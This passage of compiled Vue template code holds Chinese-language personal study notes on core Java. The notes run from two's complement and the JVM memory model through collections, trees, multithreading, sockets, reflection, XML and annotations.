计算机中的数据都是以二进制补码的形式在运算，而补码则是通过反码和原码推算出来的。 \n     原码： 看数据 ，反码：转数据 ，补码：运算数据\n     原码 ：\n     二进制的定点表示法。最高位是符号位。 0 代表正 1代表负值 其余位数表示值的大小\n     一个字节等于8个比特位 ，也就是 8个二进制位\n     byte b1 = 7  ;   0(符号位)0000111    byte b2 = -7 ; 1(符号位) 0000111\n     反码：\n     正数的反码与其原码相同 ； 负数的反码与其原码逐位取反（0变1 ， 1 变 0），符号位除外\n     补码：\n     正数的补码与其原码相同 ； 负数的补码是在其 反码  的末位 加 1 得到的 \n     二维数组\n     int[][] arr 或者   int arr[][]   或者    int[] arr[]  \n      int[][] arr = mew int[30][10];  30个一维数组 ，每个一维数组有10个元素\n    ")]),t("div",{staticClass:"text-red"},[n._v("\n        方法执行完成 弹栈消失\n    ")]),t("pre",[n._v("       类文件在方法区 ，对象实例在堆内存 ， \n       对象实例的方法地址指向方法区的类文件内的方法\n      变量在栈内存，地址指向堆内存中的类的实例对象\n       方法的调用， 类的实例对象的方法的调用 会进栈 \n      类的主方法 main 方法 会被 jvm 主动调用 ，然后 main 方法 进栈\n       代码由上往下执行， 方法顺序进栈  ， 栈内 方法 先进后出。\n       最后调用的方法完成执行后 最先消失 \n       当方法 执行完成 弹栈 消失\n       ")]),t("div",{staticClass:"text-h6"},[n._v("基础")]),t("pre",[n._v(" \n       单个实例对象的 实例在 堆内存中 ，实例的  成员属性在堆内存，\n      成员方法 在方法区 ，但是堆内存中存有 成员方法的内存地址\n      成员变量： \n      类中方法外的变量 ，有初始默认值 ，堆内存 ，随对象GC 消失\n      局部变量：\n      类中方法内的变量 ，无初始默认值， 栈内存 ，随着方法的执行完成弹栈消失\n      private 权限修饰符 \n      私有 保证数据安全 ，需要根基需求提供 set 和 get 方法 获取 和设置 私有 成员属性 \n      java 类的 构造方法\n      1.方法名称和类名相同，大小写一致\n      2.没有返回值类型，连 void 也没有\n      3.没有具体的返回值 ，不能 由 return 带回 结果数据\n\n      java 类的 构造方法 可以通过 方法的 重载 通过不同的参数 进行 不同 的 初始化\n   ")]),t("div",[n._v("String")]),t("pre",[n._v('     "" 创建的字符串  存在 字符串常量池   （在  堆内存 存储 ） 存在则不再创建  ,不可改变\n     s1 = "123"  s2 = "123"  s1==s2 结果是true \n     new 创建的 每次都是不同的 内存地址 放在 堆内存中 new 创建的  不可能相等\n     字符串的加号拼接 ：系统底层会自动创建一个 stringBuilder 对象 ，\n     再调用其append 方法完成拼接 。拼接后，再调用toString 方法 转换为 String 类型\n     因此  s1="abc"  s2="ab"  s3=s2+"c"   s1==s3   s3 是变量计算拼接 不是常量拼接  返回  false  \n     "abc" == "a" + "b" + "c"  返回 true 原因 ：\n      a,b,c 都是常量 java 的 常量优化机制 在编译的时候 就把右侧直接计算了\n      equals 方法 比较 值是否相等\n      String 类型 + 常量字符串 的 字符串拼接每次都会创建 两个对象 ，一个 stringBuilder 一个 string \n   ')]),t("div",[n._v("StringBuilder   一个可变的字符串类   append toString  reverce")]),t("div",[n._v("打印string  stringBuilder 集合 类  都不会出现内存地址。  打印数组  会出现 ")]),t("div",[n._v(" 集合 ArrayList")]),t("pre",[n._v("       Student[] arr = new Student[3]  \n\n    集合和数组 对比\n    集合类 ：  提供一种存储空间可变的存储模型，容量可变\n    数组类 ：   容量是固定的 不可变的 \n    ArrayList  list = new ArrayList();\n    集合内 可以放任意类型数据      \n    泛型\n    ArrayList<String>  list = new ArrayList <>();\n    集合内 只能放 字符串 String 数据   \n    集合常用API :   add remove  set  get size        \n   ")]),t("div",[n._v(" 高级面向对象 ")]),t("pre",[n._v("        业务对象类  本身  \n        DAO  访问存储数据的数组 或者集合  data access object\n        Service  用来 处理业务逻辑 ，服务器内部的 逻辑\n        Controller  用来 处理     用户  和网页 的相关 逻辑  \n        业务逻辑流程：\n        controller 的 addItem 调用 service  的 addItem , service  的 addItem 调用 dao 的 addItem\n       与试图打交道的 类 调用 与数据库打交道的类 ，与数据库打交道的类 调用 数据库类\n\n        private  static  ， static 修饰的  静态成员属性 在内存中 所有这个类的实例中共享\n         一般 存在于方法区中 \n   ")]),t("div",[n._v("继承")]),t("pre",[n._v("       继承： 让类鱼类之间产生 父子类关系 ， 子类可以直接使用 父类的非私有的成员  \n              例如 你可以用你爸爸的车 ，但你不能用他的内裤 \n              父类 ： 基类 超类   子类 ： 派生类 \n              public class ZI extends FU { }\n        继承好处：复用性，维护性，让类之间产生关系是多态的前台\n        继承弊端：继承是侵入性的 ，不灵活 ，子类   必须拥有父类的非私有属性和方法\n                  耦合性强   父类中 非私有的东西 不能随便改 随便删除 \n        JAVA 只支持 单继承 ，不支持 多继承 ，但是 支持多层继承  \n         一个儿子不能 有两个亲爹 ，但是可以 有 爷爷 ， 有十八辈祖宗    \n         this  自己的 当前类的  super  父级的   父类的 \n         this() 访问本类的构造方法  super()访问父类的构造方法\n        子父类同名属性或者方法：    可以通过 this.  读取 自己的 属性方法   ，super. 读取 父级的 属性方法\n        \n        方法 重写  ， 注解  @Override 检查 是否 正确重写 （必须一模一样）\n        "),t("div",{staticClass:"text-red"},[n._v("\n            "),t("div",[n._v("父类的静态方法，个非静态方法 ， 子类必须一摸一样的名字才能重写 ")]),n._v("\n            \n            "),t("div",[n._v("静态方法不能重写，父子类静态方法同名 ，只是子类将父类中的同名方法隐藏起来了。  就近原则")]),n._v("\n        ")]),n._v("\n        子类 重写 父类 方法 ， 权限必须大于等于 父类 权限 \n        java  四个 权限修饰符   private  小于 默认 小于 protected  小于 public \n        private  同一个类中\n        默认     同一个包中 子类 无关类\n        protected 不同包的子类\n        public   不同包的 无关类\n\n        子类的  构造方法 会默认调用 super() ；即便是不写 ，也会默认加上。不然子类没办法拿到继承而来的东西\n\n        其实每一个类  都继承与 Objiect  类 如果没 指定继承则该类的构造方法 默认 继承自 Object 默认调用 super()\n\n        抽象类   abstract\n        抽象方法： 将共性的方法 抽取到父类之中后，发现该方法的实现逻辑无法确定，该方法就要可以定义为抽象方法\n        抽象类： 如果一个类中 存在 抽象方法 ，那么这个类 就必须 声明为 抽象类\n        public  abstract void aa();  \n        public  abstract class  A1{}\n        public  class A99  extends A1{}\n        抽象类 只能被 继承 实现 。 不能创建 实例对象。因为 没有方法体的方法 不能调用。\n        抽象类的 子类 必须 重写 父类的  抽象方法 ， 但是 子类也可以把自己变成 抽象类。\n        抽象类 不一定有抽象方法， 有抽象方法的类 必定是抽象方法 \n\n        抽象类  体现的是 一种  模板设计模式  \n        final 关键字 可以修饰 属性 方法 类名   ，final 修饰的 属性方法 将不能重写 ，类不能  继承 ，一般用于  属性 和方法  禁止重写 \n        局部代码块 在 方法中定义，限定变量的 生命周期，快速释放，提高内存利用率\n         { }  构造代码块 在 类的 构造方法执行之前执行 ，  可以放  构造方法的 公用代码 \n         static {}  静态代码块 随着 类的加载而加载，只执行一次， 一般用于数据初始化 ，只在类文件加载的时候执行。和构造方法调用无关\n                \n   ")]),t("div",[n._v("接口")]),t("pre",[n._v("       抽象类 可以制定 模板 ，制定一定规则 去让子类去实现\n       但是如果某个抽象类的所有方法都是抽象方法的时候，我们就可以将其定义为接口\n       接口也是一种引用数据类型， 比抽象类 更加抽象 \n       接口的存在有两个重要意义： 1. 规则的定义  2. 程序的扩展性\n       public interface AA {}\n       接口本身 和 抽象方法一样不能实例化 \n       public class AA_ZI implements AA{} \n       类不能多继承 ，但是 类 可以实现 多个接口 \n       接口 因为是定义规则  ， 接口中的 属性 变量  默认是 final 修饰的 不能被修改 静态的 \n       全部的修饰符 是  public static final \n       接口没有构造方法 \n       接口中可以 使用 default 定义修饰 默认方法 ，默认方法 只要是用于 接口的迭代升级\n       类 实现多个接口 ，如果多个接口中有重名的 默认方法 ，  子类 必须重写 这个 方法 \n       接口中可以 使用 static 定义修饰 静态 方法  通过 接口名.静态方法名 来调用  \n       接口中 可以有  静态 方法  默认方法 私有方法  抽象方法   \n\n        继承亲爹 实现干爹  \n\n        类和类之间       继承关系   只能 单继承  但是可以 多层继承    你-- 你爹  -你爷爷  - 你十八辈子祖宗\n        类和接口之间     实现关系   可以单实现也可以多实现 ，还可以在继承一个类的时候 同时实现多个接口\n        接口和接口之间   继承关系   可以单继承也可以多继承            \n\n       \n   ")]),t("div",[n._v(" 多态")]),t("pre",[n._v("       通用对象类型  ，例如 全球 70 亿人 实例 都是 人类 \n       多态的前提是  要有 继承 或者实现关系  ，要有方法重写 ，要有父类引用 指向子类对象\n\n       Animal a = new Cat();\n       多态中的 成员访问 特点\n       构造方法：  同继承一样 ，子类会通过  super 访问 父类 构造器\n       成员变量： 编译看左边 父类  ， 执行 看左边父类\n       成员方法：  编译看左边父类，   执行 看 右边子类\n        多态 弊端：  不能调用子类特有 方法 属性\n       多态中的 转型\n       向上转型  父类引用  指向子类对象     把一个 子类类型  转换为 一个 父类类型   小的转大的  不用强制转换\n       向下转型  子类引用  指向父类对象     把一个 父类类型  转换为 一个 子类类型    大的转小的  需要强制类型转换\n       instanceof  \n       \n   ")]),t("div",[n._v(" 内部类")]),t("pre",[n._v('       Outer.Inner i = new Outer().new Inner();\n       匿名内部类\n       函数式编程思想\n       lambda   箭头 函数   是将 匿名 内部类 的  一个  优化 \n       doaaaa( AA a){ a.nn(); }\n        doaaaa(new AA(){\n            public void nn(){\n                sout("Niubi ")\n            }\n        })\n       doaaaa(()->{  sout("Niubi ") })\n       匿名内部类 ，必须 实现一个接口 ，生产 一个实现类的对象 ，重写方法 ，读取重写的方法 ，执行方法  \n       这个方法 根本的阐述    传递的是一个函数 ， 箭头函数方式 我们直接传入 的 是 方法的 实体 ，\n       把原本的关注点 转到方法的具体实现\n       lambda 使用前提：  必须有一个接口  接口中 有且仅有一个 抽象方法 \n       这种 根本上 传入的  还是一个 匿名对象，实例的 匿名实现类的 一个具体的 对象\n   ')]),t("div"),t("pre",[n._v("        collection  map   list  arraylist  linkedlist set hashset treeset   HashMap   TreeMap\n        数组长度固定， 集合 会自动扩缩容 每次 1.5倍数，长度小于10  是 10\n        栈  压栈 弹栈\n        队列  入队列             出队列    前端  后端   \n        数组   查询快 增删慢   因为 增删 需要 把后面的 每个都平移一位 \n        链表    增删快 查询慢  必须 从  头开始查  单向链表\n        链表   结点   头结点（地址）数据地址数据地址。。。。。^ 结束  火车一样，每一个结点 都由 数据 和地址组成  \n                链表有头有尾  尾巴 是 一个空地址   ，前一个结点 记录后一个结点的地址值\n        双向链表      前一个结点的地址+值+下一个结点的地址   \n        linkedlist 链表  增删方法比较特殊 ， 有一些特殊方法 \n\n        泛型  \n        不写 默认 Object,,提供 编译时候 安全检测机制   \n        \n        collection  单列集合   list set \n        set 没有索引 只能用迭代器  iterator 进行迭代    或者 增强 for 进行魂环 \n        hashset  treeset\n        treeset 可以对 内部元素 进行 排序 要想使用 treeset 必须 指定 排序规则   自然排序\n          内部的 元素 必须 实现 comparable 接口  并且重写 compareTo 方法 \n          compareTo  返回 0 则 不存储 ， 大于存右边 ，小于存左边\n          字符串也有 compareTo 方法 \n          comparator  比较器 类 实现 compare 方法  抽象类\n        \n\n        数据结构 树   结点\n          二叉树    结点  父节点+当前节点值+左子节点+右子节点 \n          二叉树的查询都是从根节点进行查询\n          度： 每一个节点的子节点的 数量\n          高度， 二叉树的 根节点 到最 末梢结点的 最长层级 ，也就是 分叉 分了 几次+1\n\n          普通二叉树     二叉查找树，二叉搜索树\n          普通二叉树     左右子节点 大小没关系\n          二叉查找树     左子节点小于右边子节点  ，一样的 不存储  ，\n          二叉查找树     每一次存储一个值 都要从根节点 开始找路径 进行比较，找到自己的位置 ，\n                         可能出现 左右子树高度差的很远\n          平衡二叉树     任意左右节点 的 两个子树都是一棵平衡二叉树 ，左右高度相差不超过1\n                         左右 旋转 ， 变化根节点，根节点 会变化，普通二叉树 不会变根节点\n                         左旋 ，原本根节点的右节点 升为根节点 \n                                新的根节点的 原本的左节点 倒向左侧， 链接旧的的根节点作为右侧，做为右弦\n                         右旋 ：和上面的左旋 处处相反\n                         左左插入--右旋 ， \n                         左右插入--失衡区域左旋，然后整体右旋 ，两次旋转\n                         右右插入--左旋\n                         右左插入--失衡区域右旋，然后整体左旋\n          红黑树         一种自平衡的二叉查找树 ，但不是高度平衡，不是每次都去计算是否平衡，有自己的红黑规则\n                         每一个节点 都是 红色 或者黑色\n                         根节点必须黑色\n                         如果一个节点没有子节点或者父节点，则这个节点相应的值为Nil，被称为叶节点，都是黑色的\n                         如果一个节点是红色的，那么它的子节点必须是黑色的，不能出现两个红色的节点相连\n                         每一个节点，从该节点到它所有的后代叶节点的简单路径上，都包含相同数目的黑色节点\n                         红黑树多了一个颜色属性\n                         添加三个默认黑色 调整两次\n                         添加三个默认红色 调整1次数\n                         红黑树为了提升性能，默认添加数据颜色为红色\n                         红黑树  ---旋转 区域小，只旋转了父节点 祖父节点， 把父节点提升祖父节点下降作为父节点的右子节点 ，或者左子节点\n                         红黑树 添加数据 需要变色 ，只有在父节点红色，叔叔节点黑色，才会旋转\n        \n        hashset  \n          \n              a.hashCode() 计算 哈希值， 同一个对象的 哈希值 一样的\n              0.75 扩展因子， 满容量的 0.75  则扩容 2倍数\n              集合 ，每个位置 一个哈希 ，如果 相同哈希，则存在同一个位置， 同一个位置总数小于8 采用 链表 ，大于等于8 采用 红黑树\n           hashset  必须重写 hashcode 和 equals 方法   \n            \n        MAP\n        Interface Map K,V     \n        键值对 ，entry 对象\n        hashmap  底层 还是 数组 和 红黑树 ，也有 扩展因子  和 hashset 很类似 \n        terrmap  底层 是根据key 排序的 treeset 类似的 原理 \n\n        可变参数  （int ...a）  类似 js 的 数组解构， 底层是一个数组，是一种  简便写法\n        \n        stream  流\n        流 操作 可以 过滤 和js 的  过滤一样  相当于读数据中 每个去过滤 执行\n        流水线 ，每次操作一波，  流水线 ，准备物料 --\x3e 各种一次次操作加工 --\x3e出货  . 获取流--\x3e 中间方法--\x3e 终结方法\n        list1.stream().filter(()->{ }).filter(()->{ }).filter(()->{ }).filter(()->{ }).filter(()->{ }).forEach(()->{})\n        list1.stream().filter(()->{ }).filter(()->{ }).filter(()->{ }).filter(()->{ }).filter(()->{ }).xollect(Collectors.toList())\n        stream.of()\n        limit()  skip() \n        \n        \n        \n        \n                   \n   ")]),t("div",[n._v("IO")]),t("pre",[n._v("        字节流 写 各种文件类型 \n        字符流 写  记事本 txt 文件 \n        释放资 源 close     捕获错误\n        FileOutputStream   FileInputStream \n        字节缓冲流  BufferedOutputStream   BufferedInputStream\n        字符输出流   FileWriter   \n        字符缓冲流  BufferedWriter   BufferedReader\n        转换流\n        对象操作流   ObjectOutputStream   ObjectInputStream  \n                       对象需要实现 可序列化接口 ，需要抛出各种异常  需要看 demo\n                       transient  路过的  序列化跳过字段  例如密码\n        properties  \n                    MAP       双列集合的操作流  \n                    put   setProperty \n                    load  加载.property 文件\n                    store  存储.property 文件      \n                    等号 形式 ，键值对 ，一般作为配置文件  .property 文件\n                    搜索  .property 文件 读取   需要关闭 IO 流 \n                    \n        apche-commons-io\n        \n        \n    ")]),t("div",[n._v(" 多线程")]),t("pre",[n._v("        cpu 在 多个 进程中 高速切换， 表征是 同时运行 ，例如电脑 同时 执行很多个软件\n        并行： 同一时刻，有多个指令 在多个 CPU 上 同时执行    三个人同时做三件事\n        并发： 在同一时刻， 有多个指令 在单个CPU 上交替执行   一个人同时做三件事\n\n        进程 线程\n        进程： 正在 运行的 软件   ，独立 动态 并发\n        线程： 单个进程中的单个顺序控制流 ，一条执行 路径\n               单线程： 一个进程  只有一条执行路径\n               多线程： 一个进程  有多条执行路径 \n        多线程的 实现方案\n         1.继承 Thread 类   2.实现 Runable 接口 ，调用 Thread 类  3. 利用 callable 和 future 接口实现  ，调用 Thread 类 \n         继承 Thread 类   \n         继承 线程类 重写 run 方法  创建一个线程对象 ，开启多个线程  t1.start()\n         run 方法 没有开启线程 ，只是一般的方法 ， start 方法 开启线程\n         实现 Runable 接口\n         定义xx类 实现 Runable 接口  重写 run 方法  创建对象 xxa\n         创建 Thread 类对象 把  xxa对象 作为构造方法的参数 启动线程\n         类 可执行 run 方法      线程 可执行 start 方法   \n         琼东一个线程 去 执行 可执行类的 run 方法 \n         利用 callable 和 future 接口实现 \n         定义一个类 实现 callable 接口  重写 call 方法  创建 aa 对象\n         创建 future 接口 的 实现类 ff对象  把aa对象 作为 ff构造方法的参数  FutureTask\n         创建 Thread 类对象 ，把 ff对象 作为 构造方法的参数  启动线程\n         这种 方式 可以有返回值\n\n        传递给 thread 的 参数 必须 实现了  runable 接口\n        线程的  get 方法 可以 获取 线程执行完的 返回结果 \n        线程 可以自定义  线程名字   setName  getName\n        线程   可以  sleep  休眠  时常  \n\n        线程调度\n        计算机中的 CPU  在任意时刻只能执行一条机器命令。每个线程只有在 获得CPU 的使用权才能执行代码\n        各个线程轮流获得CPU的 使用权 ，分别执行各自的任务 \n        分时调度模型   ，抢占式调度模型 \n        java 使用的是 抢占调度模式  ，每个线程可以 设置 优先级 (10-1)   setPriority\n        \n        后台线程  守护线程    普通线程执行完成后，守护线程不再执行\n        setDaemon   设置为守护线程\n\n        线程 安全问题\n        三个窗口卖100张电影票 ， 相同票买了很多次 ，出现 负数票号\n        执行每一行代码的时候 ，CPU  执行权力 都可能被别的线程 抢走。 \n        多线程安全问题是因为多线程操作共享数据造成的\n        加锁----------------加锁      \n        十个人抢着上一个厕所，抢到的上厕所就立即锁门 ，免得别人进厕所  ，同步执行的代码块，只能单线程，别的只能等 \n        多线程安全问题的解决方案基本思想： 让程序没有安全问题的环境\n        解决方法：\n                把多条语句操作共享数据的代码给锁起来，让任意时刻只能有一个线程执行即可\n                java 提供了同步代码块的方式 来解决\n        synchronized(任意锁对象（类的静态成员属性，全部类实例公用的）){多条线程操作的共享数据的代码块} \n                              代码执行会去改变和还原这个锁对象， 锁对象 必须唯一\n        synchronized 会自动上锁\n                    好处： 线程安全\n                    坏处： 线程很多的时候，每个线程都会去判断同步上的锁，很消耗资源，会降低程序的运行效率\n        同步方法和同步代码块：\n                同步代码块可以锁住指定的代码，同步方法是锁住方法中的所有代码\n                同步代码块可以指定锁对象，同步方法不能指定锁对象\n                同步方法 的锁对象 是锁定的  this  对象本身\n        Lock 锁接口       lock  unlock    自定义 锁定 和解锁方法 ， 方便\n        死锁：是指两个或者多个线程相互之间持有对方所需要的 资源，相互等待，无法继续执行。 叉号\n             死锁是多个锁的 嵌套导致\n         生产者，消费者     \n        wait  notify  notifyAll    等待 通知 唤醒  ，使用 锁对象 去 等待和唤醒\n            等待和唤醒机制，需要中间参照    厨师 ，餐桌，顾客\n        阻塞队列    \n        queue    BlockingQueue    一根管子  通道 ， 一头生产者一头消费者 ， 消息队列\n        ArrayBlockingQueue   底层 数组 ，有界限\n        LinkedBlockingQueue  底层 链表 ，无界限   最大为 int 的最大 值\n        阻塞队列 设置最大值  while 循环 无线 添加  无线读取 ， 超限 报警\n        线程池 volatile  threadpool  线程池    executor    submit 提交任务\n        线程 生命周期：创建 new： start---就绪 runnable： 有执行资格，无执行权限---运行：抢到执行权 run----结束 死亡 垃圾回收  \n        线程  其他状态： 阻塞（有锁 lock blocked） ， 等待（wait） ，计时等待(sleep) ，唤起 就绪 notify  \n        线程的每次创建，等待创建和销毁以及等待销毁 都消耗系统资源，因此 线程池 很重要， 就好比碗柜，吃饭拿碗，吃碗放回去\n        线程池 执行原理 和 100人食堂吃饭，使用可循环的碗筷一样 ，只不过 这个放碗的碗柜 可以自己制造碗 \n        Executors 可以创建 线程池  ，  \n        ExecutorService 可以管理线程池 定量或者不限量   poll-1-thread-1  线程池子内的线程的 getName 返回的 样子\n        Thread.currentThread().getName()\n        ThreadPoolExector  \n        核心线程数，最大线程数，空闲线程最大存活时间，时间单位，任务队列，创建线程工厂，任务的拒绝策略\n        任务的拒绝策略：1.丢弃并抛异常 2.丢弃不抛异常 3.抛弃队列中等待最久的任务，添加当前任务 4.调用任务的run方法跳过线程池直接执行\n         修改了共享数据 ，某些线程不知道修改 ，消息不同步  反复无常 ，不稳定\n        共享数据的修改并不能 通知告知 哥哥线程 自己修改了 ， 每个线程也没有每次都去都最新的 ，而是从自己的变量副本读取\n        每个线程有自己的独立的线程栈  ，共享数据 ，多个线程共享、  共享数据在每个线程内是变量副本 ，不是时时刻刻从共享数据读取\n        volatile  ： 强制要求 每次线程执行的时候 去读取 最新的 共享数据 ，在变量前面 加上 volatile 这个关键字  （不稳定的）\n        public static volatile int money = 100000;\n        加了 volatile 之后：  同步代码块 synchronized 执行步骤：\n         1.线程获得锁 2.清空变量副本 3.拷贝共享变量最新的值到变量副本 4.执行代码 5.将修改后的变量副本中的值赋值给共享数据  6. 释放锁 \n\n        原子性： 是指在一次操作或者多次操作中，必须所有的操作全部完整执行才可以，否则所有的操作都不执行，多个操作是一个不可分割的整体\n        原子性 ： 比如 银行转账  扣款和到账必须 是一体的 \n        volatile  只能保证 最新 ，不能保证原子性     volatile   +   synchronized锁  可以保证 原子性  ， 但是 性能较差\n        Atomic 接口  原子类 接口  实现保证原子性，更新 数据  AtomicInterger   以 原子的方式 对值进行修改\n        把共享数据  使用 原子类来实现 ， 共享数据的改变使用  使用原子类来操作    ac.incrementAndGet\n        原子类 原理 ：  自旋锁 + CAS算法 \n                       CAS 算法 有三个操作数 ： 内存值V 旧的预期值A 要修改的值B \n                       自旋操作： 当 A==V 修改成功，把V 赋值为B ， 当 A!=V 修改失败 不做任何操作V还是原来的，并且重新获取现在的最新值\n                              这个重新获取的动作就是自旋。  自旋以后重新去执行CAS算法 ，执行运算\n                               \n         volatile   +   synchronized锁 与 Atomic  CAS  的区别\n            相同点： 多线程情况下都能保证共享数据的安全\n            不同点： （悲观锁）synchronized锁 总是从最坏的角度出发 ，认为每次获取的数据的时候别人都可能修改了，因此每次读取共享数据之前都上锁\n                     （乐观锁）CAS 从乐观的角度出发，假设每次获取数据别人都不会修改，所以不上同步锁，\n                     只不过在每次修改共享数据的时候都会检查一下，别人有没有修改过数据。 （旧的期望值 等不等于  当前的内存值（变量副本中的值））\n         hashmap 是线程不安全的 ，多线程环境下存在问题。为了保证数据安全可以使用 hashTable 但是 hashTable 效率低下 \n                   hashTable  是 悲观锁 实现 数据安全性 ， 只要有数据改变 ，就锁表\n         ConcurrentHashMap 既可以保证线程安全，数据安全 ，又可以保证执行效率    （并发的 hash 双列表 结构） \n         ConcurrentHashMap JDK1.7\n                    二次哈希 ，也会锁表，但是锁的是单个地址位置上的 hashentry数组 ,不影响其他位置使用\n                    第一次会根据 键的哈希值来计算出 在大数组中的应存入的位置，  \n                    如果为null ，创建小数组，二次哈希，计算出小数组的存储位置， 存入。 \n                    如果不为null,先找到小数组，再计算出小数组中的位置，没有就存，有就比较后存储，\n\n         ConcurrentHashMap JDK1.8\n                    数组 链表 红黑树  CAS 原子锁  ，只锁 单个位置上的链表或者红黑树\n         CountDownLatch (倒数计秒 取插销)  传递需要等待的线程数   很奇怪 的 东西  ， 线程数 ，等待 ，以及通知 。某个线程 干完事说一声\n                    CountDownLatch  可以传递给每一个线程， 用于几个线程之间通知 线程执行完毕的状态\n                    每个线程执行完 要调用  countdown 方法   ，再等待的线程 wait 等待 ，等它等待的几条线程全部执行完毕，会被自动唤起开始继续执行\n                    例如 要等待 三个线程 ，等三个线程都完成了 则 再等待的线程开始执行 ， 底层原理 是一个计数器\n        Semaphore     信号标， 通行证 ，令牌 ， 一段时间内 只能去允许 几个线程执行 ， 当某一个执行完成，释放信号，归还通行证， \n                     别的等待的就能领取通行证，开始执行。 原理就跟 限定10辆车进入园区一样， 进去拿通行证，出去交还通行证，最多十辆\n                     多个线程 共同找同一个管理员：   获取通行证 ， 拿到通行证开始执行 方法块代码，执行完了 ， 归还通行证\n                     \n        \n    ")]),t("div",[n._v(" 网络编程  UDP TCP")]),t("pre",[n._v("        三要素： IP地址  端口  协议     ，服务运行的 IP , 程序跑的端口 ， 约定的协议\n        ping 域名  可以取到 这个域名 的 IP \n        IPV4 本身 是 32bit  4个8bit 位置的数组组成   点分 十进制 表示法   127.23.36.23  256 的4次方  42亿个地址左右\n        IPV6 是  128个bit 位置  每16个一组 ，分为8组  冒分 十六进制 表示法   2404:3c00:484d:b300:84ff:c8e3:999c:ecf2   \n        InetAddress  可以获取 电脑的 相关的 名字属性等  网络相关的  地址 协议 等\n        \n        UDP 协议  面向无连接的协议 ，不管对方是否建立连接 ，   速度快 最多64K 不安全 容易丢失数据\n        TCP 协议  面向有连接的协议 ，速度慢 ，没有大小限制 ，数据安全  \n\n        UDP 通讯程序\n            DatagramSocket   数据程序通信    指定端口收发数据 。 发送的都是 字节码  接收 可以指定接收容器大小\n            发送端：  步骤： 新建socket对象， 新的接收消息存放箱子，  消息打包  ，发送出去 ，释放资源 \n            接收端：  步骤： 新建socket对象， 新的接收消息存放箱子，  消息打包  ，从箱子获取消息 ，释放资源 \n        UDP 三种通讯形式： 单播， 组播 （局域网） ，广播     \n            单播 发送端 指定 接收端 ip 和端口   接收端 接收 指定的 IP端口\n            组播 在 224.1.x.x  号段 端口  组播 需要 发送端 和接收端约定 组播地址 ip 和端口\n            广播 在 255.255.255.255  号段  端口  接收端 接收指定 端口  ， 广播针对 当前路由器链接的所有电脑\n            无论如何  接收端 都需要订阅  或者固定 IP端口  或者是 号段\n        TCP 通讯程序\n            在客户端和 服务端 各自建立一个 socket 对象\n            TCP 发送数据通讯之前 必须保证 连接建立\n            客户端    发送数据步骤：\n                    1.创建 客户端的 Socket 对象 与指定的 服务端 链接  Socket( host ,port)\n                    2.获取输出流 ，写数据   OutputStream \n                    3.释放资源  close \n            服务端    接收数据步骤：  \n                    1.创建服务器端的Socket 对象  ServerSocket(port)\n                    2.监听客户端链接，  accept()  如果收到数据则返回一个Socket 对象 ，  死等 阻塞形式的等待\n                    3.获取输入流，读数据，并把数据显示在控制台   InputStream \n                    4.释放资源   close \n\n            注意点：不论是 客户端还是服务器端，有至少有一个写入或者写出流 和 一个 socket 需要 关闭 释放资源 \n                    如果是建立链接后多次写入写出 ，则需要使用 socket 去 关闭写入写出流，并且对socket 没有影响 ，不会关闭自己 \n                    如果传输中文，需要把字节流转换为 字符缓冲流\n                    1. accept 方法是阻塞的 ，作用是等待客户端 链接\n                    2. 客户端创建对象并链接服务器，此时是通过三次握手协议保证跟服务器之间的连接\n                    3.和UDP 相反， TCP 针对客户端来讲，是往外写，是输出流。 针对服务端来讲，是往里读，是输入流\n                    4.服务器 读数据也是阻塞的 ，一直读取\n                    5.在客户端关闭输出流的时候， 还会向服务器发送一个结束标记 的动作 信息\n                    6.客户端断开链接，通过四次挥手协议保证链接终止\n            三次握手： 1.客户端向服务器端发出链接请求 ，等待服务器确认是否可以链接\n                       2.服务器端向客户端返回一个相应，告诉客户端收到了请求，你可以链接/或者不能链接\n                       3.客户端向服务器端再次发出确认信息， 建立链接  去索要东西\n            四次挥手： 1.客户端向服务器发出取消连接请求\n                       2.服务器向客户端返回一个响应，表示收到客户端的取消请求\n                        中间这里，服务器将最后的数据处理完毕\n                       3.服务器向客户端发出确认取消的消息\n                       4.客户端再次发送确认消息 ，取消链接      \n            文件上传要使用 线程池  多线程 实现\n                             \n\n\n    ")]),t("div",[n._v("类加载器和 反射")]),t("pre",[n._v('        classLoader   类加载器     \n        启动类加载器  平台类加载器  系统类加载器  自定义类加载器\n        双亲委派模型  默认先由 父加载器加载类文件 \n        类加载器，可以去加载文件 返回 字节流 \n\n        java的 反射机制   reflect\n               是指再 java 运行状态中，对于任意一个类，都能知道这个类的所有属性和方法\n               对于任意一个对象，都能够调用它的任意属性和方法\n               这种动态获取信息以及动态调用对象的功能称为 java 语言的反射机制\n            通过配置文件 动态的加载类名 和方法名字， 进行调用   \n        获得 class 对象的三种形式   Student.getClass()  Class.forName(类的全类名)   Student.class  \n         使用 反射 获取 类的  constructor field   method  单个对象 的  实例\n        利用反射创建对象实例步骤：\n            1.forName 获取 class 对象\n            2.获取构造方法对象\n            3.利用newInstance  创建 类 的 对象\n            被 private 修饰的 成员 是不能直接使用的，如果使用反射强行获取并且使用，需要临时取消访问检查\n            setAccessible  暴力反射  强行使用\n            field  get  set 设置值 必须指定对象 \n            method  invoke 运行方法\n\n        XML \n            小于  <  大于 > 和号 & 单引号 \' 双引号 "\n            <![CDATA[内容]]>\n            XML 解析 ： jaxp   jdom dom4j  pull  \n            add as libary\n            使用 解析插件  解析xml  获得  document 对象\n        DTD  schema\n        自定义dtd    自定义 文档定义类型\n        !DOCTYPE 跟标签 SYSTEM 本地文件路径\n        !DOCTYPE 跟标签 PUBLIC  文件名  文件网络上的路径\n        ELEMENT ATTLIST \n        schema  .xsd  文件     schema 文档约束文件   更加灵活\n        名称空间 约定  顺序 类型\n\n        枚举  ENUM \n            通过枚举类名.枚举项名称 方式去访问指定的枚举项\n            每一个枚举项其实就是该枚举的一个对象\n            枚举也是一个类，可以去定义成员变量、\n            第一行必须是枚举项\n            枚举类可以有构造器 ，必须是 private 的\n            枚举类也可以有抽象方法，但是枚举项必须重写这个方法\n\n        注解\n            deprecated 过时的   suppressWarning 压制警告  retention 注解存活保留时间 生命周期\n            注解是给编译器看的 ，代表一些特殊功能\n            自定义注解 \n            public @interface 注解名称{\n                    public 属性类型 属性名() default 默认值;\n            }\n            自定义注解的 属性 类型 可是是 基本类型， class 类型 注解类型  枚举类型 ，或者这些可选类型的一维数组类型\n            在使用注解的时候，如果注解里面的属性没有指定默认值，就需要我们手动给出注解属性的默认值\n            @anni(name="但是此时") 针对 value 这个特殊的注解属性，如果只需要给这个属性赋值则可以@ann("杀杀杀")\n            利用反射 获取到类的 方法 ，方法是 method 类的 实例 method 有方法判定是否自身有注解\n            method 注解包内有 方法判定是否预设了指定的注解 